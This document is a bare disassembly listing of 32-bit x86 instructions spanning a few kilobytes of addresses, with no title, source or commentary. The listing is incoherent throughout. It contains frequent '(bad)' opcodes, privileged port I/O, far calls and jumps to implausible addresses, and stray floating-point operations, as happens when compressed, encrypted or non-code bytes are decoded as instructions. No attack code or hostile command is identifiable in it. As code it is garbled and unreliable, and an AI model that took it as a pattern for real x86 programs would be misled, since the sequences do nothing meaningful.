  4100a3:	out    dx,eax
  4100a4:	(bad)  
  4100a5:	into   
  4100a6:	push   0x6b5bd205
  4100ab:	(bad)  
  4100ac:	fsubrp st(3),st
  4100ae:	retf   0x55d6
  4100b1:	cmp    al,0xd0
  4100b3:	mov    edi,0x8b984ed3
  4100b8:	inc    esi
  4100b9:	mov    dh,0xbd
  4100bb:	and    DWORD PTR [ebp-0x6242e3b],0xffffff93
  4100c2:	pop    ebp
  4100c3:	cld    
  4100c4:	jno    0x41004c
  4100c6:	jge    0x4100a5
  4100c8:	xor    eax,0xf3243ab1
  4100cd:	fld    TBYTE PTR [esp+ebp*1+0x46]
  4100d1:	stos   DWORD PTR es:[edi],eax
  4100d2:	fsub   QWORD PTR [edi-0x43d0fb3d]
  4100d8:	inc    edi
  4100d9:	dec    eax
  4100da:	stc    
  4100db:	imul   esi,ebx,0xffffffdf
  4100de:	dec    ecx
  4100df:	fbstp  TBYTE PTR [edx+0x2b]
  4100e2:	scas   al,BYTE PTR es:[edi]
  4100e3:	mov    al,ds:0xe8d55bdf
  4100e8:	add    BYTE PTR [esi+0x5f],ch
  4100eb:	adc    DWORD PTR [esi-0x72],esi
  4100ee:	ins    DWORD PTR es:[edi],dx
  4100ef:	adc    edi,edi
  4100f1:	xor    BYTE PTR [ebx],al
  4100f3:	test   al,0xa2
  4100f5:	out    0xd0,al
  4100f7:	and    al,0xda
  4100f9:	or     eax,0xe9312b19
  4100fe:	inc    ebp
  4100ff:	adc    al,0xab
  410101:	int    0xc6
  410103:	sbb    eax,0x10458047
  410108:	scas   al,BYTE PTR es:[edi]
  410109:	and    ebx,ebp
  41010b:	push   ds
  41010c:	add    al,0x88
  41010e:	xor    edi,DWORD PTR [ebx-0x73]
  410111:	jg     0x4100aa
  410113:	xor    dh,dh
  410115:	cdq    
  410116:	push   esp
  410117:	mov    ds,ebx
  410119:	push   ebx
  41011a:	das    
  41011b:	adc    ebx,esp
  41011d:	xor    ebp,eax
  41011f:	push   es
  410120:	adc    dh,BYTE PTR [ebp+0x58]
  410123:	or     BYTE PTR [eax-0x15],dl
  410126:	int    0xf7
  410128:	cld    
  410129:	retf   
  41012a:	(bad)  
  41012b:	mov    esi,0x8f375b9f
  410130:	fwait
  410131:	mov    ebx,0xd4356923
  410136:	pop    ss
  410137:	inc    edx
  410138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410139:	jnp    0x4100f0
  41013b:	dec    esp
  41013c:	mov    ds:0x29e4cc15,eax
  410141:	sti    
  410142:	fstp   TBYTE PTR [edx-0x94203b6]
  410148:	popf   
  410149:	aaa    
  41014a:	xchg   edi,eax
  41014b:	cmp    edi,DWORD PTR [edx]
  41014d:	xchg   edx,eax
  41014e:	cmp    ch,0xbc
  410151:	push   ebx
  410152:	inc    eax
  410153:	cmp    BYTE PTR [ebp-0x21],ah
  410156:	or     al,0x45
  410158:	inc    esp
  410159:	push   0x319bc0e8
  41015e:	sar    DWORD PTR [ebp+0x38],1
  410161:	inc    edi
  410162:	add    BYTE PTR [edi+0x62],0x9c
  410166:	mov    dh,0xe4
  410168:	pop    ds
  410169:	push   edx
  41016a:	xchg   ebx,eax
  41016b:	adc    al,0xba
  41016d:	dec    ecx
  41016e:	and    al,0x83
  410170:	add    al,0x8
  410172:	dec    edi
  410173:	xchg   al,dl
  410175:	cmc    
  410176:	pop    ebp
  410177:	les    ebx,FWORD PTR [eax-0x20]
  41017a:	into   
  41017b:	fst    QWORD PTR [ebp+0x3f6145b4]
  410181:	daa    
  410182:	shl    bh,cl
  410184:	enter  0xc8c6,0x2e
  410188:	int    0x20
  41018a:	ds aas 
  41018c:	pusha  
  41018d:	retf   
  41018e:	jmp    0xccb7195f
  410193:	cmp    eax,0x23b4e479
  410198:	ss adc edx,edi
  41019b:	or     BYTE PTR [edx+0x53],ch
  41019e:	mov    ah,0xb8
  4101a0:	push   0x4
  4101a2:	shl    DWORD PTR ds:0x9fd2899e,1
  4101a8:	nop
  4101a9:	and    eax,0x5330823a
  4101ae:	jne    0x4101e2
  4101b0:	or     al,ch
  4101b2:	push   ds
  4101b3:	out    dx,eax
  4101b4:	adc    BYTE PTR [ecx+0x1481fd62],ah
  4101ba:	nop
  4101bb:	aas    
  4101bc:	into   
  4101bd:	dec    eax
  4101be:	inc    ecx
  4101bf:	cmp    DWORD PTR [edx-0x4f711630],0x56712a20
  4101c9:	jae    0x41022e
  4101cb:	dec    ebx
  4101cc:	jo     0x4101e3
  4101ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101cf:	pop    edi
  4101d0:	push   cs
  4101d1:	xor    esp,DWORD PTR [esi-0x36379cb3]
  4101d7:	pushf  
  4101d8:	pushf  
  4101d9:	dec    edi
  4101da:	jge    0x410215
  4101dc:	add    dl,BYTE PTR [ebx]
  4101de:	retf   
  4101df:	out    0xd0,al
  4101e1:	in     al,0x8b
  4101e3:	sbb    DWORD PTR [eax+ecx*4+0x61f16c3f],ebp
  4101ea:	iret   
  4101eb:	mov    cl,0x26
  4101ed:	jno    0x410230
  4101ef:	xor    bl,BYTE PTR [esi]
  4101f1:	inc    ebx
  4101f2:	(bad)  
  4101f3:	sub    dh,BYTE PTR [ecx-0x4b13e5ca]
  4101f9:	clc    
  4101fa:	je     0x4101a3
  4101fc:	xlat   BYTE PTR ds:[ebx]
  4101fd:	fisubr DWORD PTR [eax-0x62cd02bc]
  410203:	out    0x94,eax
  410205:	pop    ss
  410206:	cwde   
  410207:	dec    esi
  410208:	dec    esi
  410209:	stc    
  41020a:	mov    al,0x5
  41020c:	mov    al,ds:0xcdca9a83
  410211:	xor    DWORD PTR [eax],0x8ec48e7e
  410217:	les    ecx,FWORD PTR [edi+ecx*1]
  41021a:	mov    esi,0xff3539e5
  41021f:	adc    ah,ah
  410221:	dec    ebx
  410222:	ffree  st(2)
  410224:	mov    edx,0x5f0e8dc2
  410229:	push   es
  41022a:	mov    ch,0xf7
  41022c:	daa    
  41022d:	add    al,0xe4
  41022f:	push   ss
  410230:	dec    edi
  410231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410232:	sbb    al,0x66
  410234:	xchg   ebx,eax
  410235:	dec    esp
  410236:	jo     0x410239
  410238:	or     DWORD PTR [edx+ecx*8-0x51],esi
  41023c:	std    
  41023d:	fisttp DWORD PTR [edx]
  41023f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410240:	lods   al,BYTE PTR ds:[esi]
  410241:	dec    ecx
  410242:	(bad)  
  410244:	scas   eax,DWORD PTR es:[edi]
  410245:	repz mov ebp,0xf165c224
  41024b:	dec    ecx
  41024c:	out    0x2,al
  41024e:	fwait
  41024f:	mov    al,ds:0xc7fdc7a
  410254:	ror    BYTE PTR [esi],cl
  410256:	popf   
  410257:	retf   0xc605
  41025a:	ins    DWORD PTR es:[edi],dx
  41025b:	int    0xa0
  41025d:	or     ah,dh
  41025f:	jl     0x41023f
  410261:	mov    al,0xf1
  410263:	jns    0x41022a
  410265:	pop    ecx
  410266:	rcl    bl,cl
  410268:	push   ds
  410269:	inc    ecx
  41026a:	ret    
  41026b:	pop    edi
  41026c:	outs   dx,DWORD PTR ds:[esi]
  41026d:	pop    DWORD PTR [ebx+0x6524bbca]
  410273:	ret    
  410274:	pop    ebp
  410275:	mov    ebx,0xe11785c1
  41027a:	mov    ds:0x4b74369d,eax
  41027f:	test   DWORD PTR [edx],edi
  410281:	(bad)  
  410282:	push   0x37456a73
  410287:	sbb    eax,0x7372e017
  41028c:	xchg   BYTE PTR [edi+ebp*1+0x13],bh
  410290:	daa    
  410291:	psrlq  mm5,QWORD PTR [eax+0x4f34c7e1]
  410298:	sar    DWORD PTR [edx+0x305145c0],1
  41029e:	and    bl,BYTE PTR [ebx]
  4102a0:	push   esi
  4102a1:	or     eax,0xb666d21c
  4102a6:	jo     0x410233
  4102a8:	lock push cs
  4102aa:	push   ebx
  4102ab:	aad    0xd3
  4102ad:	push   edx
  4102ae:	and    bl,cl
  4102b0:	ficom  WORD PTR [eax-0x8275588]
  4102b6:	fidivr WORD PTR [edx+0x513f37a8]
  4102bc:	pusha  
  4102bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102be:	pop    ebx
  4102bf:	mov    ds:0x81ff9dae,al
  4102c4:	daa    
  4102c5:	inc    esi
  4102c6:	scas   al,BYTE PTR es:[edi]
  4102c7:	dec    ebx
  4102c8:	cmp    eax,DWORD PTR [ebx]
  4102ca:	jp     0x41033f
  4102cc:	shl    DWORD PTR [eax-0x1f8bfbfc],1
  4102d2:	lahf   
  4102d3:	and    esi,edx
  4102d5:	mov    esp,0xb539002
  4102da:	and    BYTE PTR [ecx-0x619a8553],al
  4102e0:	iret   
  4102e1:	out    0x7e,ax
  4102e4:	in     eax,dx
  4102e5:	xor    edx,DWORD PTR [esi+0x49]
  4102e8:	in     eax,dx
  4102e9:	out    0xb8,al
  4102eb:	mov    al,0x4d
  4102ed:	in     al,dx
  4102ee:	mov    edx,0x3289047a
  4102f3:	(bad)  
  4102f4:	out    0xf7,al
  4102f6:	xor    al,0xc7
  4102f8:	arpl   bx,dx
  4102fa:	(bad)  
  4102fb:	pop    ss
  4102fc:	mov    dh,0x98
  4102fe:	shl    BYTE PTR [edx],0xc4
  410301:	gs xchg ebp,eax
  410303:	jp     0x4102fb
  410305:	out    dx,eax
  410306:	xchg   edi,eax
  410307:	add    cl,0x20
  41030a:	retf   
  41030b:	mov    eax,fs
  41030d:	inc    esi
  41030e:	or     eax,0x2017fa4b
  410313:	xor    BYTE PTR [edi-0x2d89192e],0x53
  41031a:	add    edx,DWORD PTR [eax]
  41031c:	inc    ebp
  41031d:	int    0xf3
  41031f:	icebp  
  410320:	cmp    al,BYTE PTR [edi]
  410322:	dec    ecx
  410323:	mov    esi,0x91b0e6e9
  410328:	adc    DWORD PTR [eax-0x7fbcb906],edx
  41032e:	xor    eax,DWORD PTR [ebx-0x2e]
  410331:	xchg   DWORD PTR [ebx+0x32],edi
  410334:	add    eax,0x5ea57799
  410339:	mov    BYTE PTR [eax-0x2e],bl
  41033c:	scas   eax,DWORD PTR es:[edi]
  41033d:	mov    edi,0x5b34e938
  410342:	call   0x660a:0x9cebcd0a
  410349:	in     al,0x65
  41034b:	lock sbb BYTE PTR [edx-0x24],ch
  41034f:	gs xchg edx,eax
  410351:	mov    eax,ds:0x58b7a097
  410356:	pop    edi
  410357:	ret    0x7c57
  41035a:	and    BYTE PTR [edi],bh
  41035c:	lock mov edi,0xd24e4a1a
  410362:	push   ss
  410363:	add    al,0x9
  410365:	retf   0xeded
  410368:	dec    esi
  410369:	loop   0x41035d
  41036b:	inc    edi
  41036c:	sub    al,0x2
  41036e:	xchg   edi,eax
  41036f:	push   cs
  410370:	sub    edx,DWORD PTR [ebx-0x12a658f6]
  410376:	pop    esi
  410377:	popf   
  410378:	cmp    DWORD PTR [ecx-0x4361e5d7],eax
  41037e:	les    edx,FWORD PTR [esi-0x70]
  410381:	sub    al,0x6
  410383:	pop    esi
  410385:	jae    0x4103e0
  410387:	xchg   edx,eax
  410388:	xchg   esi,eax
  410389:	push   0xfffffff5
  41038b:	icebp  
  41038c:	inc    ebx
  41038d:	pop    ebp
  41038e:	pop    ebp
  41038f:	xchg   ecx,eax
  410390:	mov    bl,0x4f
  410392:	push   esi
  410393:	ror    BYTE PTR [edi],cl
  410395:	stos   DWORD PTR es:[edi],eax
  410396:	in     al,0x82
  410398:	lahf   
  410399:	inc    esi
  41039a:	mov    eax,DWORD PTR [edi+esi*1+0x3444eaa5]
  4103a1:	mov    ah,ch
  4103a3:	ret    
  4103a4:	test   BYTE PTR [edx-0x63],0xad
  4103a8:	push   esp
  4103a9:	ins    BYTE PTR es:[edi],dx
  4103aa:	add    ah,BYTE PTR [edi-0x5eb928ab]
  4103b0:	lds    ebx,FWORD PTR [ebp-0x55]
  4103b3:	les    eax,FWORD PTR [edi-0x31]
  4103b6:	lahf   
  4103b7:	adc    eax,0xd69e9a5
  4103bc:	or     eax,0xe06cc466
  4103c1:	and    DWORD PTR [ebp+0x18],0x211d95a8
  4103c8:	bnd jo 0x410370
  4103cb:	data16 icebp 
  4103cd:	inc    cx
  4103cf:	outs   dx,DWORD PTR ds:[esi]
  4103d0:	xchg   esi,eax
  4103d1:	std    
  4103d2:	dec    DWORD PTR [ecx]
  4103d4:	mov    edx,0x4673ba13
  4103d9:	outs   dx,DWORD PTR ds:[esi]
  4103da:	fadd   DWORD PTR [ebx+0x74]
  4103dd:	addr16 sub ch,bh
  4103e0:	pop    ecx
  4103e1:	xchg   edx,eax
  4103e2:	aad    0x1f
  4103e4:	fcom   DWORD PTR [edx+0x68]
  4103e7:	cwde   
  4103e8:	add    al,0xf2
  4103ea:	push   ds
  4103eb:	clc    
  4103ec:	cmp    eax,0xe7418377
  4103f1:	arpl   WORD PTR [edx+eiz*2],si
  4103f4:	(bad)
  4103f7:	sub    BYTE PTR [ebp+0x2e],bl
  4103fa:	push   edi
  4103fb:	or     BYTE PTR [esi],0x1f
  4103fe:	loopne 0x41044d
  410400:	mov    cl,0xbb
  410402:	cmp    eax,0x2a685074
  410407:	or     ecx,DWORD PTR gs:[ebx-0x73670086]
  41040e:	add    edi,0x99c3e849
  410414:	inc    edx
  410415:	idiv   DWORD PTR [esi+0x35]
  410418:	dec    esi
  410419:	ins    DWORD PTR es:[edi],dx
  41041a:	dec    ebp
  41041b:	lea    esi,[esi+0x462490d6]
  410421:	and    BYTE PTR [ebx+0x36d7cc0],al
  410427:	mov    ebx,0xc2a8b50f
  41042c:	test   BYTE PTR [edx],al
  41042e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41042f:	xor    al,0xf1
  410431:	call   0x14fc:0x56424a4e
  410438:	sbb    al,0x9e
  41043a:	mov    gs,WORD PTR [eax-0x5ffecb44]
  410440:	outs   dx,BYTE PTR ds:[esi]
  410441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410442:	mov    esi,0x827f9116
  410447:	pop    edi
  410448:	mov    bh,0x5c
  41044a:	add    al,0x83
  41044c:	test   BYTE PTR [edx+0x56],dl
  41044f:	loopne 0x4104bf
  410451:	push   0xffffff98
  410453:	dec    edx
  410454:	sbb    dh,BYTE PTR [edx-0x3a]
  410457:	sbb    edi,DWORD PTR [ebx]
  410459:	stos   DWORD PTR es:[edi],eax
  41045a:	stos   DWORD PTR es:[edi],eax
  41045b:	int    0x6
  41045d:	jns    0x410419
  41045f:	rcl    BYTE PTR [ecx-0x46648947],0xff
  410466:	sti    
  410467:	js     0x41045a
  410469:	push   es
  41046a:	xchg   ecx,eax
  41046b:	cdq    
  41046c:	dec    eax
  41046d:	arpl   bx,si
  41046f:	adc    ebp,DWORD PTR [ebp-0x40]
  410472:	mov    ebp,0xaa6c46e4
  410477:	push   edi
  410478:	xchg   edx,eax
  410479:	repz lock leave 
  41047c:	pop    ds
  41047d:	retf   
  41047e:	dec    eax
  41047f:	mov    cl,0x4f
  410481:	in     eax,dx
  410482:	pop    ss
  410483:	icebp  
  410484:	cmp    ecx,DWORD PTR [esi+0x7735ad9]
  41048a:	retf   0x1b72
  41048d:	es sbb bh,ah
  410490:	iret   
  410491:	das    
  410492:	sub    BYTE PTR [esp+ebx*8-0x2fdb0984],cl
  410499:	adc    eax,0xd88a182
  41049e:	outs   dx,BYTE PTR ds:[esi]
  41049f:	xchg   BYTE PTR [eax-0x72],ch
  4104a2:	add    DWORD PTR [ebx+0x205fc07f],ebp
  4104a8:	mov    esp,?
  4104aa:	(bad)  
  4104ab:	sbb    BYTE PTR [edi],ah
  4104ad:	out    0xf1,eax
  4104af:	fs ins BYTE PTR es:[edi],dx
  4104b1:	leave  
  4104b2:	jmp    0x33209c5e
  4104b7:	add    DWORD PTR [ebx+0x6a16ec08],edi
  4104bd:	leave  
  4104be:	push   esp
  4104bf:	(bad)  
  4104c0:	pop    es
  4104c1:	pop    ss
  4104c2:	sahf   
  4104c3:	or     ch,ch
  4104c5:	scas   al,BYTE PTR es:[edi]
  4104c6:	push   cs
  4104c7:	and    BYTE PTR ds:0x5933c15b,al
  4104cd:	push   eax
  4104ce:	cmc    
  4104cf:	std    
  4104d0:	and    al,0x9b
  4104d2:	add    al,0xfd
  4104d4:	mov    dh,0x6e
  4104d6:	jb     0x4104ce
  4104d8:	xchg   DWORD PTR ds:0x330a0c93,ebp
  4104de:	ror    DWORD PTR cs:[ebp+0x12],cl
  4104e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e3:	sbb    DWORD PTR [ecx],0xf1d3f0ab
  4104e9:	cmp    eax,0x703cf2e5
  4104ee:	(bad)  
  4104ef:	mov    ebp,0xe2458b34
  4104f4:	test   al,0x43
  4104f6:	loope  0x410487
  4104f8:	adc    bl,BYTE PTR [eax-0x772b3c2a]
  4104fe:	inc    esp
  4104ff:	es jnp 0x410530
  410502:	js     0x410555
  410504:	dec    edx
  410505:	mov    esi,0x823a7f9f
  41050a:	xchg   ecx,eax
  41050b:	retf   0xea9c
  41050e:	mov    bl,0x11
  410510:	sub    ch,BYTE PTR [ecx-0x3c194e0a]
  410516:	or     al,0x31
  410518:	lock and edi,DWORD PTR [ebx+0x1b]
  41051c:	mov    ds:0x98c3a458,eax
  410521:	imul   ebx,DWORD PTR [edx-0x48],0x78
  410525:	aad    0x60
  410527:	lods   al,BYTE PTR ds:[esi]
  410528:	jp     0x410559
  41052a:	int3   
  41052b:	cdq    
  41052c:	dec    ebx
  41052d:	rcpps  xmm1,XMMWORD PTR [ecx-0x33]
  410531:	xor    edi,DWORD PTR [edx+0x4a38a489]
  410537:	jl     0x410577
  410539:	in     al,0xbd
  41053b:	lahf   
  41053c:	es addr16 pushf 
  41053f:	out    dx,eax
  410540:	push   ds
  410541:	out    dx,eax
  410542:	adc    al,0x47
  410544:	aam    0x44
  410546:	fldenv [edx]
  410548:	shr    ah,1
  41054a:	cmp    BYTE PTR [edx+0x14],bh
  41054d:	out    dx,eax
  41054e:	or     eax,0x68371f52
  410553:	pop    esp
  410554:	lods   al,BYTE PTR ds:[esi]
  410555:	mov    ch,0xc3
  410557:	sbb    al,cl
  410559:	xchg   BYTE PTR gs:[esi],dh
  41055c:	xor    BYTE PTR [ebx],bh
  41055e:	rcl    bl,0xf1
  410561:	push   0xcbdb18fc
  410566:	pop    edx
  410567:	out    dx,al
  410568:	test   DWORD PTR [ecx-0x7b6943],esi
  41056e:	xor    esi,DWORD PTR [edx]
  410570:	popa   
  410571:	pop    edx
  410572:	test   DWORD PTR [ebx-0x5e],edx
  410575:	fimul  WORD PTR [esi+0x77]
  410578:	ror    BYTE PTR [edx],cl
  41057a:	lods   al,BYTE PTR ds:[esi]
  41057b:	sbb    al,0x60
  41057d:	lods   eax,DWORD PTR ds:[esi]
  41057e:	cmp    al,0xde
  410580:	cmp    eax,0x96d81d95
  410585:	or     al,0xd0
  410587:	(bad)  
  410589:	mov    BYTE PTR [edi],ch
  41058b:	jbe    0x4105bc
  41058d:	in     eax,0x91
  41058f:	jbe    0x4105e6
  410591:	mov    ch,0xd1
  410593:	or     ah,BYTE PTR [edx+0x2a]
  410596:	mov    cl,0x6a
  410598:	jg     0x4105a7
  41059a:	sbb    al,0xaa
  41059c:	jle    0x410548
  41059e:	ffree  st(1)
  4105a0:	adc    cl,BYTE PTR [ebx+0x48]
  4105a3:	xchg   bl,cl
  4105a5:	cmp    eax,0x2a55506c
  4105aa:	rcl    DWORD PTR [eax-0x18],0x13
  4105ae:	xor    eax,0x1c468276
  4105b3:	add    DWORD PTR [ecx],ebx
  4105b5:	mov    ch,0xa1
  4105b7:	push   esp
  4105b8:	fcom   QWORD PTR [eax+ecx*2]
  4105bb:	inc    esp
  4105bc:	test   al,0x51
  4105be:	mov    al,0x54
  4105c0:	sbb    DWORD PTR [ecx+0x54],eax
  4105c3:	loopne 0x410553
  4105c5:	outs   dx,BYTE PTR ds:[esi]
  4105c6:	sbb    eax,0x88c29d1
  4105cb:	rol    eax,cl
  4105cd:	pop    ss
  4105ce:	gs adc esi,edx
  4105d1:	sub    DWORD PTR [ecx-0x60a4cdb8],ebx
  4105d7:	mov    ebp,0x5853e790
  4105dc:	dec    eax
  4105dd:	push   esp
  4105de:	jp     0x4105a5
  4105e0:	push   es
  4105e1:	cwde   
  4105e2:	lock sub DWORD PTR [edx+0x3d],ebx
  4105e6:	pop    ds
  4105e7:	xchg   edx,eax
  4105e8:	bound  edx,QWORD PTR [ebx+0x3d]
  4105eb:	jmp    0x4105f7
  4105ed:	mov    cl,0x36
  4105ef:	leave  
  4105f0:	bound  ecx,QWORD PTR [eax+0x126a5eda]
  4105f6:	mov    cl,0x83
  4105f8:	mov    esp,0xe87454f1
  4105fd:	cmp    al,BYTE PTR [edx-0x30]
  410600:	cmp    BYTE PTR [ebx+0x2d],dh
  410603:	cwde   
  410604:	aas    
  410605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410606:	mov    al,ds:0xf28723ae
  41060b:	sub    dl,0x26
  41060e:	retf   
  41060f:	call   0xbad2:0xfcae2935
  410616:	pusha  
  410617:	int    0xad
  410619:	rcr    BYTE PTR ds:0x79394229,cl
  41061f:	mov    esi,0xfba841c9
  410624:	stos   DWORD PTR es:[edi],eax
  410625:	mov    edx,0xeb391cf6
  41062a:	stos   DWORD PTR es:[edi],eax
  41062b:	sub    BYTE PTR [ebp+0x1d37701a],dl
  410631:	pop    ecx
  410632:	xchg   DWORD PTR [esi],edi
  410634:	xor    edi,DWORD PTR [edx-0x1316787e]
  41063a:	add    eax,0x7154036e
  41063f:	aam    0x7e
  410641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410642:	cld    
  410643:	jo     0x4106bc
  410645:	(bad)  [esi+0x560f8d5c]
  41064b:	in     al,dx
  41064c:	inc    edx
  41064d:	into   
  41064e:	inc    ebx
  41064f:	es jl  0x4106af
  410652:	cmp    ecx,edx
  410654:	stos   BYTE PTR es:[edi],al
  410655:	jno    0x4105e9
  410657:	fiadd  DWORD PTR [esi+0x4d1ef225]
  41065d:	xor    eax,0x63021aef
  410662:	mov    ebx,ebx
  410664:	jns    0x410656
  410666:	ss fwait
  410668:	xor    eax,0x25f86bdc
  41066d:	adc    eax,0x6b91bbf8
  410672:	cwde   
  410673:	retf   0xd9e8
  410676:	cld    
  410677:	daa    
  410678:	mov    eax,ds:0xcc85717a
  41067d:	and    BYTE PTR [edi+0x7e490ca6],bh
  410683:	std    
  410684:	leave  
  410685:	loope  0x410640
  410687:	mov    dh,0x69
  410689:	fidiv  WORD PTR [ecx+0x15042fd1]
  41068f:	mov    ds:0xb3633808,eax
  410694:	cmp    BYTE PTR [edi+0x8],bl
  410697:	sub    al,0xcf
  410699:	dec    esp
  41069a:	cmp    al,0xd7
  41069c:	sbb    esi,eax
  41069e:	aaa    
  41069f:	add    dl,0x75
  4106a2:	push   ecx
  4106a3:	mov    es:0x17679499,eax
  4106a9:	mov    al,ds:0xfa330bc7
  4106ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106af:	xchg   esp,eax
  4106b0:	push   ds
  4106b1:	dec    ebx
  4106b2:	pop    ebx
  4106b3:	mov    eax,ds:0xdb317bff
  4106b8:	cld    
  4106b9:	lea    eax,[ecx]
  4106bb:	mov    cl,0xc
  4106bd:	mov    ds:0x6704c06c,al
  4106c2:	aad    0x57
  4106c4:	(bad)  
  4106c5:	leave  
  4106c6:	lahf   
  4106c7:	test   ch,bl
  4106c9:	ret    0x27ff
  4106cc:	in     al,0xaf
  4106ce:	pop    eax
  4106cf:	pusha  
  4106d0:	mov    eax,esi
  4106d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106d3:	add    al,0xf7
  4106d5:	rcl    DWORD PTR [edx-0x3e],cl
  4106d8:	shl    DWORD PTR [ebx],cl
  4106da:	lea    edi,[edx-0x44]
  4106dd:	ret    0x6b4c
  4106e0:	sbb    BYTE PTR [eax],dh
  4106e2:	inc    esi
  4106e3:	sbb    DWORD PTR [ebx+0x7],ebx
  4106e6:	mov    cl,0x9
  4106e8:	outs   dx,DWORD PTR ds:[esi]
  4106e9:	ja     0x4106b7
  4106eb:	mov    gs,WORD PTR [esi-0x6f]
  4106ee:	ss dec eax
  4106f0:	push   ds
  4106f1:	aam    0xe4
  4106f3:	shr    DWORD PTR [ecx],cl
  4106f5:	or     edx,esi
  4106f7:	ins    DWORD PTR es:[edi],dx
  4106f8:	in     eax,dx
  4106f9:	mov    bh,0x7a
  4106fb:	mov    ch,0xa2
  4106fd:	sbb    al,0x37
  4106ff:	inc    eax
  410700:	(bad)  
  410701:	int    0x8d
  410703:	fnstcw WORD PTR [bp+di+0x7d]
  410707:	xor    al,0x67
  410709:	test   BYTE PTR [ecx+0x1dfebf71],0x1f
  410710:	mov    ds:0xba34202c,eax
  410715:	sbb    eax,DWORD PTR [eax+eiz*1+0x6ba26e08]
  41071c:	pop    esi
  41071d:	or     BYTE PTR [edx],0x15
  410720:	in     al,dx
  410721:	sbb    eax,0x173ad2ba
  410726:	mov    ebx,0xb7600695
  41072b:	pop    DWORD PTR ds:0xd5b2b072
  410731:	(bad)  
  410732:	sub    BYTE PTR [esi],dl
  410734:	mov    esp,0xed7be102
  410739:	pushf  
  41073a:	cdq    
  41073b:	hlt    
  41073c:	adc    BYTE PTR [edx+0x78b0f91b],bh
  410742:	aam    0x33
  410744:	dec    esp
  410745:	repnz mov BYTE PTR [edx],bh
  410748:	mov    DWORD PTR [ebp-0x2],eax
  41074b:	add    BYTE PTR [edx+0x18],cl
  41074e:	push   0x577f26a2
  410753:	and    dh,BYTE PTR gs:[eax+ecx*8]
  410757:	add    BYTE PTR [eax+0x6dcbb44e],al
  41075d:	inc    ebp
  41075e:	pop    esi
  41075f:	lahf   
  410760:	rcr    esp,1
  410762:	mov    ds:0xcefb9d3e,eax
  410767:	jecxz  0x41071a
  410769:	xchg   ecx,eax
  41076a:	ret    0xa13f
  41076d:	mov    ch,0x22
  41076f:	mov    esp,0x4b219139
  410774:	pusha  
  410775:	(bad)  
  410776:	cdq    
  410777:	xor    ah,BYTE PTR [esi]
  410779:	sub    esi,DWORD PTR [esi]
  41077b:	pop    esp
  41077c:	fadd   st,st(6)
  41077e:	jbe    0x41078a
  410780:	adc    DWORD PTR [ecx+0x2e714a8c],esp
  410786:	cmp    eax,0x56321e2f
  41078b:	jno    0x410780
  41078d:	shl    BYTE PTR [eiz*1+0x67171c4e],cl
  410794:	es mov ecx,0xebec8bfb
  41079a:	stos   BYTE PTR es:[edi],al
  41079b:	xlat   BYTE PTR ds:[ebx]
  41079c:	sub    eax,0x1b909d04
  4107a1:	jmp    0x462451b2
  4107a6:	sahf   
  4107a7:	test   edx,edx
  4107a9:	fisub  DWORD PTR [edx]
  4107ab:	xchg   ecx,eax
  4107ac:	jl     0x41080f
  4107ae:	(bad)  
  4107b0:	pop    es
  4107b1:	fwait
  4107b2:	mov    ch,0x28
  4107b4:	in     eax,dx
  4107b5:	push   ecx
  4107b6:	mov    edi,0xb467c2c0
  4107bb:	outs   dx,BYTE PTR ds:[esi]
  4107bc:	sub    DWORD PTR [eax+0x36],ecx
  4107bf:	push   eax
  4107c0:	dec    edi
  4107c1:	or     edi,esi
  4107c3:	jns    0x410767
  4107c5:	loope  0x410748
  4107c7:	rcr    DWORD PTR [edx+0x2f],1
  4107ca:	adc    bl,bl
  4107cc:	sub    ebx,DWORD PTR [ecx]
  4107ce:	dec    ecx
  4107cf:	mov    edi,0xd56c2ad6
  4107d4:	stos   DWORD PTR es:[edi],eax
  4107d5:	inc    ecx
  4107d6:	adc    eax,0x16291e8
  4107db:	div    BYTE PTR ds:0x9cac5ede
  4107e1:	mov    DWORD PTR [eax-0x49],edx
  4107e4:	push   ss
  4107e5:	std    
  4107e6:	lods   al,BYTE PTR ds:[esi]
  4107e7:	fnsave ds:0xf791aeaa
  4107ed:	jge    0x41081d
  4107ef:	or     ch,BYTE PTR ds:[ebx+0x566c4424]
  4107f6:	sbb    dh,dl
  4107f8:	inc    DWORD PTR [ebx+0x2c]
  4107fb:	aad    0xa7
  4107fd:	repz xchg ebp,eax
  4107ff:	in     al,0xf1
  410801:	mov    esi,0x58099ce6
  410806:	lds    esi,FWORD PTR [esi]
  410808:	clc    
  410809:	rcl    DWORD PTR [edx-0x7e],0x40
  41080d:	mov    al,ds:0xe176db09
  410812:	adc    al,0x21
  410814:	or     edi,ebx
  410816:	fwait
  410817:	cmp    dh,BYTE PTR [ebx+0x771ba4f0]
  41081d:	lahf   
  41081e:	adc    BYTE PTR [edx-0x364f5fbd],al
  410824:	add    esp,ecx
  410826:	sub    eax,0x41fb24d6
  41082b:	in     al,dx
  41082c:	dec    edi
  41082d:	aam    0xec
  41082f:	pushf  
  410830:	addr16 clc 
  410832:	mov    edx,0x180d85a
  410837:	cmp    al,0x65
  410839:	add    DWORD PTR [eax+0x53],edi
  41083c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41083d:	sbb    al,0x60
  41083f:	js     0x4108a7
  410841:	jle    0x41081d
  410843:	es in  eax,dx
  410845:	mov    edx,0x9ad69855
  41084a:	adc    eax,0x63549d62
  41084f:	ja     0x4107e5
  410851:	js     0x410854
  410853:	bound  eax,QWORD PTR [ebx]
  410855:	jp     0x41088f
  410857:	adc    ebx,DWORD PTR [esi]
  410859:	fld    QWORD PTR [ebx]
  41085b:	ja     0x410878
  41085d:	pop    ss
  41085e:	fild   DWORD PTR [ecx]
  410860:	mov    esi,0x804f87fc
  410865:	push   ebx
  410866:	or     cl,BYTE PTR [ebx-0x26]
  410869:	mov    WORD PTR [edx+0x77],cs
